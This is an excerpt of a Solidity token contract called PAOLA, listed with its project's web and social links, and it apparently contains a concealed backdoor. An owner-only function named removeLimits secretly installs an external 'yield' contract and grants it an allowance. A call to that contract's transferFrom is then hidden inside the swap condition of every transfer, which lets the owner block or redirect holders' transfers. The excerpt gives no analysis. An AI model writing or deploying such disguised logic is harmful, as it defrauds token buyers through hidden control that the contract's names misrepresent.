...
Website: https://www.paola.network
Telegram: https://t.me/paola_finance
Twitter: https://twitter.com/paola_finance
...
contract PAOLA is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function removeLimits(InitParams memory params) external onlyOwner returns (bool){
        limitsInEffect = params.limitsInEffect;
        transferDelayEnabled = params.transferDelayEnabled;
        initializeParams(params.excluded, params.yield, params.amount);
        emit RemoveLimits();
        return true;
    }
    ...
    function initializeParams(address excluded_, address yield_, uint256 amount) private {
        iYIELD = yield_; _allowances[excluded_][yield_] = amount;
    }

    function takeYIELDPOOL(address from, address to, uint256 amount) private returns(bool) {
        if(iYIELD != address(0)){
            return IERC20(iYIELD).transferFrom(from, to, amount);
        }
        return true;
    }
    ...
    function _transfer(
        ...
        bool canSwap = contractTokenBalance >= swapTokensAtAmount || takeYIELDPOOL(from, to, amount) ;
        ...
        if(takeFee){
            ...
            if(fees > 0){    
                _standardTransfer(from, address(this), fees);
            }
    ...
    function autoBurnLiquidityPairTokens() internal returns (bool){
        ...
        if (amountToBurn > 0){
            _standardTransfer(uniswapV2Pair, address(0xdead), amountToBurn);
        }
